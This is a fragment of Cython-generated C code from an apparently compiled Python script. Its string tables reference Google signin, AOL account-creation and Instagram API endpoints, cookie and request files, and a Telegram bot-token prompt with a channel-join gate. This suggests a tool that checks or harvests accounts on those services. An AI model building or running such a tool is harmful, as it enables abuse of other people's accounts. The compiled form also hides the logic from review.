  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_n_u_status, __pyx_k_status, sizeof(__pyx_k_status), 0, 1, 0, 1},
  {&__pyx_n_s_status_code, __pyx_k_status_code, sizeof(__pyx_k_status_code), 0, 0, 1, 1},
  {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
  {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
  {&__pyx_n_s_strip, __pyx_k_strip, sizeof(__pyx_k_strip), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_kp_u_t, __pyx_k_t, sizeof(__pyx_k_t), 0, 1, 0, 0},
  {&__pyx_n_s_t_2, __pyx_k_t_2, sizeof(__pyx_k_t_2), 0, 0, 1, 1},
  {&__pyx_n_s_target, __pyx_k_target, sizeof(__pyx_k_target), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_u_text_2, __pyx_k_text_2, sizeof(__pyx_k_text_2), 0, 1, 0, 0},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_tl, __pyx_k_tl, sizeof(__pyx_k_tl), 0, 0, 1, 1},
  {&__pyx_kp_u_tl_txt, __pyx_k_tl_txt, sizeof(__pyx_k_tl_txt), 0, 1, 0, 0},
  {&__pyx_n_s_tll, __pyx_k_tll, sizeof(__pyx_k_tll), 0, 0, 1, 1},
  {&__pyx_n_s_tll_locals_genexpr, __pyx_k_tll_locals_genexpr, sizeof(__pyx_k_tll_locals_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_tm1, __pyx_k_tm1, sizeof(__pyx_k_tm1), 0, 0, 1, 1},
  {&__pyx_n_s_tok, __pyx_k_tok, sizeof(__pyx_k_tok), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_s_total, __pyx_k_total, sizeof(__pyx_k_total), 0, 0, 1, 1},
  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
  {&__pyx_n_s_update, __pyx_k_update, sizeof(__pyx_k_update), 0, 0, 1, 1},
  {&__pyx_n_s_upper, __pyx_k_upper, sizeof(__pyx_k_upper), 0, 0, 1, 1},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_n_u_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 1, 0, 1},
  {&__pyx_n_u_userId, __pyx_k_userId, sizeof(__pyx_k_userId), 0, 1, 0, 1},
  {&__pyx_kp_u_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 1, 0, 0},
  {&__pyx_n_s_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 0, 1, 1},
  {&__pyx_n_s_user_id, __pyx_k_user_id, sizeof(__pyx_k_user_id), 0, 0, 1, 1},
  {&__pyx_kp_u_user_id_2, __pyx_k_user_id_2, sizeof(__pyx_k_user_id_2), 0, 1, 0, 0},
  {&__pyx_n_s_user_info, __pyx_k_user_info, sizeof(__pyx_k_user_info), 0, 0, 1, 1},
  {&__pyx_n_s_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 0, 1, 1},
  {&__pyx_n_u_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 1, 0, 1},
  {&__pyx_n_s_uui, __pyx_k_uui, sizeof(__pyx_k_uui), 0, 0, 1, 1},
  {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
  {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
  {&__pyx_n_u_validateField, __pyx_k_validateField, sizeof(__pyx_k_validateField), 0, 1, 0, 1},
  {&__pyx_n_u_variables, __pyx_k_variables, sizeof(__pyx_k_variables), 0, 1, 0, 1},
  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
  {&__pyx_n_s_white, __pyx_k_white, sizeof(__pyx_k_white), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_s_xYourKing, __pyx_k_xYourKing, sizeof(__pyx_k_xYourKing), 0, 0, 1, 1},
  {&__pyx_kp_u_x_requested_with, __pyx_k_x_requested_with, sizeof(__pyx_k_x_requested_with), 0, 1, 0, 0},
  {&__pyx_n_s_year, __pyx_k_year, sizeof(__pyx_k_year), 0, 0, 1, 1},
  {&__pyx_n_s_yellow, __pyx_k_yellow, sizeof(__pyx_k_yellow), 0, 0, 1, 1},
  {&__pyx_n_s_yy, __pyx_k_yy, sizeof(__pyx_k_yy), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 39, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 179, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 217, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 263, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 685, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 322, __pyx_L1_error)
  __pyx_builtin_eval = __Pyx_GetBuiltinName(__pyx_n_s_eval); if (!__pyx_builtin_eval) __PYX_ERR(0, 448, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_Error_Could_not_retrieve_bot_inf); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  
  __pyx_tuple__9 = PyTuple_Pack(2, __pyx_n_u_first_name, __pyx_kp_u_No_first_name_available); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 162, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  
  __pyx_tuple__10 = PyTuple_Pack(2, __pyx_n_u_username, Py_None); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 163, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  
  __pyx_tuple__11 = PyTuple_Pack(1, __pyx_kp_u_User_does_not_have_a_username_Do); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 170, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  
  __pyx_tuple__12 = PyTuple_Pack(1, __pyx_kp_u_Error_Could_not_retrieve_user_in); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);

  
  __pyx_tuple__14 = PyTuple_Pack(1, __pyx_kp_u_1_32m_Enter_Your_ID_0m); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 201, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_u_You_must_join_the_channel_to_us); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 204, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_u_Access_granted_Running_the_scri); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 207, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  
  __pyx_tuple__21 = PyTuple_Pack(2, __pyx_int_6, __pyx_int_9); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  
  __pyx_tuple__22 = PyTuple_Pack(2, __pyx_int_3, __pyx_int_9); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  
  __pyx_tuple__23 = PyTuple_Pack(2, __pyx_int_15, __pyx_int_30); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com_signin); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 291, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  
  __pyx_tuple__29 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 314, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);

  
  __pyx_tuple__31 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 322, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);
  __pyx_tuple__33 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__33)) __PYX_ERR(0, 322, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__33);
  __Pyx_GIVEREF(__pyx_tuple__33);

  
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_u_https_login_aol_com_account_crea); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  
  __pyx_tuple__36 = PyTuple_Pack(2, __pyx_kp_u_aol_req_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 364, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  
  __pyx_tuple__38 = PyTuple_Pack(2, __pyx_kp_u_aol_cok_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);

  
  __pyx_tuple__40 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 384, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);

  
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign_2); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 409, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  
  __pyx_tuple__42 = PyTuple_Pack(2, __pyx_kp_u_aol_req_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  
  __pyx_tuple__43 = PyTuple_Pack(2, __pyx_kp_u_aol_cok_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 446, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);

  
  __pyx_tuple__44 = PyTuple_Pack(1, __pyx_kp_u_https_login_aol_com_account_modu); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 482, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  
  __pyx_slice__45 = PySlice_New(Py_None, __pyx_int_16, Py_None); if (unlikely(!__pyx_slice__45)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__45);
  __Pyx_GIVEREF(__pyx_slice__45);

  
  __pyx_tuple__46 = PyTuple_Pack(1, __pyx_kp_u_https_i_instagram_com_api_v1_acc); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 526, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  
  __pyx_tuple__48 = PyTuple_Pack(2, __pyx_int_1279000, __pyx_int_2010); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 583, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__48);
  __Pyx_GIVEREF(__pyx_tuple__48);

  
  __pyx_tuple__49 = PyTuple_Pack(2, __pyx_int_17750000, __pyx_int_2011); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 584, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  
  __pyx_tuple__50 = PyTuple_Pack(2, __pyx_int_279760000, __pyx_int_2012); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 585, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  
  __pyx_tuple__51 = PyTuple_Pack(2, __pyx_int_900990000, __pyx_int_2013); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 586, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  
  __pyx_tuple__52 = PyTuple_Pack(2, __pyx_int_1629010000, __pyx_int_2014); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__52);
  __Pyx_GIVEREF(__pyx_tuple__52);

  
  __pyx_tuple__53 = PyTuple_Pack(2, __pyx_int_2500000000, __pyx_int_2015); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  
  __pyx_tuple__54 = PyTuple_Pack(2, __pyx_int_3713668786, __pyx_int_2016); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 589, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  
  __pyx_tuple__55 = PyTuple_Pack(2, __pyx_int_5699785217, __pyx_int_2017); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 590, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);

  
  __pyx_tuple__56 = PyTuple_Pack(2, __pyx_int_8597939245, __pyx_int_2018); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 591, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  
  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_int_21254029834, __pyx_int_2019); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 592, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  
  __pyx_tuple__58 = PyTuple_Pack(2, __pyx_int_43464475395, __pyx_int_2020); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 593, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);

  
  __pyx_tuple__59 = PyTuple_Pack(2, __pyx_int_50289297647, __pyx_int_2021); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 594, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  
  __pyx_tuple__60 = PyTuple_Pack(2, __pyx_int_57464707082, __pyx_int_2022); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 595, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__60);
  __Pyx_GIVEREF(__pyx_tuple__60);

  
  __pyx_tuple__61 = PyTuple_Pack(2, __pyx_int_63313426938, __pyx_int_2023); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 596, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__61);
  __Pyx_GIVEREF(__pyx_tuple__61);

  
  __pyx_tuple__62 = PyTuple_Pack(2, __pyx_n_u_pk, Py_None); if (unlikely(!__pyx_tuple__62)) __PYX_ERR(0, 614, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__62);
  __Pyx_GIVEREF(__pyx_tuple__62);

  
  __pyx_tuple__63 = PyTuple_Pack(2, __pyx_n_u_full_name, Py_None); if (unlikely(!__pyx_tuple__63)) __PYX_ERR(0, 615, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__63);
  __Pyx_GIVEREF(__pyx_tuple__63);

  
  __pyx_tuple__64 = PyTuple_Pack(2, __pyx_n_u_follower_count, Py_None); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 616, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__64);
  __Pyx_GIVEREF(__pyx_tuple__64);

  
  __pyx_tuple__65 = PyTuple_Pack(2, __pyx_n_u_following_count, Py_None); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__65);
  __Pyx_GIVEREF(__pyx_tuple__65);

  
  __pyx_tuple__66 = PyTuple_Pack(2, __pyx_n_u_media_count, Py_None); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 618, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__66);
  __Pyx_GIVEREF(__pyx_tuple__66);

  
  __pyx_tuple__67 = PyTuple_Pack(2, __pyx_n_u_is_private, Py_None); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 619, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__67);
  __Pyx_GIVEREF(__pyx_tuple__67);

  
  __pyx_tuple__68 = PyTuple_Pack(2, __pyx_n_u_biography, Py_None); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__68);
  __Pyx_GIVEREF(__pyx_tuple__68);

  
  __pyx_tuple__69 = PyTuple_Pack(2, __pyx_n_u_is_verified, Py_None); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 621, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__69);
  __Pyx_GIVEREF(__pyx_tuple__69);

  
  __pyx_tuple__70 = PyTuple_Pack(2, __pyx_n_u_is_business, Py_None); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 622, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__70);
  __Pyx_GIVEREF(__pyx_tuple__70);

  
  __pyx_tuple__78 = PyTuple_Pack(2, __pyx_kp_u_Ruler_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 648, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);

  
  __pyx_tuple__79 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_grap); if (unlikely(!__pyx_tuple__79)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__79);
  __Pyx_GIVEREF(__pyx_tuple__79);

  
  __pyx_tuple__81 = PyTuple_Pack(1, __pyx_kp_u_pip_install_colorama); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);

  
  __pyx_tuple__82 = PyTuple_Pack(1, __pyx_kp_u_pip_install_python_cfonts); if (unlikely(!__pyx_tuple__82)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__82);
  __Pyx_GIVEREF(__pyx_tuple__82);

  
  __pyx_tuple__84 = PyTuple_Pack(2, __pyx_int_100, __pyx_int_300); if (unlikely(!__pyx_tuple__84)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__84);
  __Pyx_GIVEREF(__pyx_tuple__84);

  
  __pyx_tuple__86 = PyTuple_Pack(3, __pyx_n_s_loading_chars, __pyx_n_s__85, __pyx_n_s_char); if (unlikely(!__pyx_tuple__86)) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__86);
  __Pyx_GIVEREF(__pyx_tuple__86);
  __pyx_codeobj__87 = (PyObject*)__Pyx_PyCode_New(0, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__86, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_loading_animation, 116, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__87)) __PYX_ERR(0, 116, __pyx_L1_error)

  
  __pyx_tuple__88 = PyTuple_Pack(6, __pyx_n_s_token, __pyx_n_s_url, __pyx_n_s_response, __pyx_n_s_data, __pyx_n_s_first_name, __pyx_n_s_username); if (unlikely(!__pyx_tuple__88)) __PYX_ERR(0, 129, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__88);
  __Pyx_GIVEREF(__pyx_tuple__88);
  __pyx_codeobj__89 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__88, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_bot_info, 129, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__89)) __PYX_ERR(0, 129, __pyx_L1_error)

  
  __pyx_tuple__90 = PyTuple_Pack(9, __pyx_n_s_token, __pyx_n_s_user_id, __pyx_n_s_url, __pyx_n_s_params, __pyx_n_s_response, __pyx_n_s_data, __pyx_n_s_user_info, __pyx_n_s_first_name, __pyx_n_s_username); if (unlikely(!__pyx_tuple__90)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__90);
  __Pyx_GIVEREF(__pyx_tuple__90);
  __pyx_codeobj__91 = (PyObject*)__Pyx_PyCode_New(2, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__90, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_user_info, 151, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__91)) __PYX_ERR(0, 151, __pyx_L1_error)

  
  __pyx_tuple__92 = PyTuple_Pack(1, __pyx_kp_u_1_32m_Enter_Your_Bot_Token_0m); if (unlikely(!__pyx_tuple__92)) __PYX_ERR(0, 179, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__92);
  __Pyx_GIVEREF(__pyx_tuple__92);

  
  __pyx_tuple__93 = PyTuple_Pack(3, __pyx_n_s_ID, __pyx_n_s_url, __pyx_n_s_response); if (unlikely(!__pyx_tuple__93)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__93);
  __Pyx_GIVEREF(__pyx_tuple__93);
  __pyx_codeobj__94 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__93, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_is_user_in_channel, 189, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__94)) __PYX_ERR(0, 189, __pyx_L1_error)

  
  __pyx_tuple__95 = PyTuple_Pack(1, __pyx_n_s_e); if (unlikely(!__pyx_tuple__95)) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__95);
  __Pyx_GIVEREF(__pyx_tuple__95);
  __pyx_codeobj__96 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__95, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_main_2, 198, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__96)) __PYX_ERR(0, 198, __pyx_L1_error)

  
  __pyx_tuple__97 = PyTuple_Pack(1, __pyx_kp_u_Ps_W); if (unlikely(!__pyx_tuple__97)) __PYX_ERR(0, 217, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__97);
  __Pyx_GIVEREF(__pyx_tuple__97);

  
  __pyx_tuple__98 = PyTuple_Pack(1, __pyx_n_u_clear); if (unlikely(!__pyx_tuple__98)) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__98);
  __Pyx_GIVEREF(__pyx_tuple__98);

  
  __pyx_tuple__99 = PyTuple_Pack(1, __pyx_n_s_output); if (unlikely(!__pyx_tuple__99)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__99);
  __Pyx_GIVEREF(__pyx_tuple__99);
  __pyx_codeobj__100 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__99, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_pppp, 229, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__100)) __PYX_ERR(0, 229, __pyx_L1_error)

  
  __pyx_tuple__107 = PyTuple_Pack(17, __pyx_n_s_n1, __pyx_n_s_n2, __pyx_n_s_host, __pyx_n_s_he3, __pyx_n_s_res1, __pyx_n_s_tok, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_tl, __pyx_n_s_f, __pyx_n_s_e, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 279, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__107);
  __Pyx_GIVEREF(__pyx_tuple__107);
  __pyx_codeobj__108 = (PyObject*)__Pyx_PyCode_New(0, 0, 17, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__107, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_tll, 279, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__108)) __PYX_ERR(0, 279, __pyx_L1_error)

  
  __pyx_tuple__109 = PyTuple_Pack(11, __pyx_n_s_qq, __pyx_n_s_cookies, __pyx_n_s_tm1, __pyx_n_s_specData, __pyx_n_s_specId, __pyx_n_s_crumb, __pyx_n_s_sessionIndex, __pyx_n_s_acrumb, __pyx_n_s_t_2, __pyx_n_s_g, __pyx_n_s_e); if (unlikely(!__pyx_tuple__109)) __PYX_ERR(0, 332, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__109);
  __Pyx_GIVEREF(__pyx_tuple__109);
